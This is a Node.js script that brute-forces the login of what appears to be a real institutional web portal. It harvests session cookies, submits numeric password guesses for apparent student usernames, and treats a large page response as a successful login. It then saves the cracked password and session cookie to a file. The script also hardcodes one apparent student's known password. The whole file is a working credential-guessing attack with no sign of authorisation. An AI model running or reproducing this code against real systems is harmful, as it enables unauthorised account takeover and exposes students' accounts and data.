const fs = require('fs').promises;
let cookiesArray ;
let cookie1;
let cookie2;
let cookie3;


async function fetchData() {
  try {
    const response = await fetch('https://mgit.winnou.net', {
      method: 'GET',
      headers: {
        'Host': 'mgit.winnou.net',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Linux"',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=0, i',
        'Connection': 'close'
      }
    });

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
console.log('Response status:', response.status); 
    
    const headers = response.headers;

    const cookiesHeader = response.headers.get('set-cookie');

    if (cookiesHeader) {
      const cookies = cookiesHeader.split(', ');

      cookies.forEach(cookie => {
        const [cookieNameAndValue, ...cookieAttributes] = cookie.split('; ');
        const [cookieName, cookieValue] = cookieNameAndValue.split('=');

        if (cookieName === 'AWSALB') {
          cookie1 = cookieValue.toString();
          //console.log(cookie1);    
        }

        if (cookieName === 'AWSALBCORS') {
          cookie2 = cookieValue.toString();
          //console.log(cookie2);
        }

        if (cookieName === '58268fa38c9b685904a25317c6c7737d') {
          cookie3 = cookieValue.toString();
          //console.log(cookie3);
        }
      });
    }
     const body = await response.text();
    console.log("Body length:", body.length);
  } catch (error) {
    console.error('Error:', error);
  }
}

async function sendpass(wpass,wuser){

const response = await fetch('https://mgit.winnou.net/index.php', {
            method: 'POST',
            headers: {
                'Host': 'mgit.winnou.net',
                'Cookie': `58268fa38c9b685904a25317c6c7737d=${cookie3}; AWSALB=${cookie1}; AWSALBCORS=${cookie2}`,
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://mgit.winnou.net/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Linux"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://mgit.winnou.net',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Priority': 'u=0, i'
            },
            body: `username=${wuser}&passwd=${wpass}&checkcaptcha=0&captcha=&SubmitL=Sign+in&option=com_user&task=login&return=aHR0cHM6Ly9tZ2l0Lndpbm5vdS5uZXQv&ff237fbfb5ed385ab3e4ee61fea21126=1`,
            redirect: 'manual' // Prevent automatic redirection
        });
        
        console.log('Response status:', response.status); // Print the response status
        const cookiesHeader = response.headers.get('set-cookie');
        //console.log('Cookies:', cookiesHeader);

        // Parse the cookies header
        if (cookiesHeader) {
            const cookies = cookiesHeader.split(', ');

            cookies.forEach(cookie => {
                const [cookieNameAndValue, ...cookieAttributes] = cookie.split('; ');
                const [cookieName, cookieValue] = cookieNameAndValue.split('=');

                if (cookieName === 'AWSALB') {
                    cookie1 = cookieValue.toString();
                    //console.log(cookie1);
                }
                if (cookieName === 'AWSALBCORS') {
                    cookie2 = cookieValue.toString();
                    //console.log(cookie2);
                }
                if (cookieName === '58268fa38c9b685904a25317c6c7737d') {
                    cookie3 = cookieValue.toString();
                    //console.log(cookie3);
                }
            });
        }
const data = await response.text();
        console.log(data);


}

async function sendweb(wpass){
const response = await fetch('https://mgit.winnou.net/index.php', {
            method: 'GET',
            headers: {
                'Host': 'mgit.winnou.net',
                'Cookie': `58268fa38c9b685904a25317c6c7737d=${cookie3};AWSALB=${cookie1}; AWSALBCORS=${cookie2}`,
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Linux"',
                'Referer': 'https://mgit.winnou.net/index.php',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Priority': 'u=0, i'
            }
        });

        console.log('Response status:', response.status); // Print the response status
        
        const data = await response.text();
        console.log('Body length:', data.length);
        if(data.length>144000){
        console.log("password is correct");
        if (wpass !== '14471154') {
        const fileHandle = await fs.open('example.txt', 'a');
        // Write the strings to the file with 5 spaces between them
        await fileHandle.write(wpass + '     ' + cookie3+'\n');

        // Close the file
        await fileHandle.close();}else{
        }
        }
} 

async function mwait() {
    // Simulate an asynchronous operation (e.g., fetching data from an API)
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            resolve('Async operation completed');
        }, 2000); // Simulating a delay of 2 seconds
    });
}

async function mainn(i){
console.log("for 6 :"+i);
let fet=await fetchData();

let result1=await sendpass(i.toString(),'20261A0556_p');

let result2=await sendweb(i.toString());
//for wait or stop script 
let wait=await mwait();

console.log("\n");

console.log("for 20261A0550_p")
let fet1=await fetchData();

let result10=await sendpass('14471154','20261A0550_p');

let result20=await sendweb('14471154');
//for wait or stop script 
let wait0=await mwait();

console.log("\n");
}

async function main(){
for (let i = 10000015; i < 10000016; i++) {
  let result =await mainn(i);
}
}
main();


//let fet1=await fetchData();
//let result10=await sendpass('14471154');

//console.log("SAI");
//let result20=await sendweb();
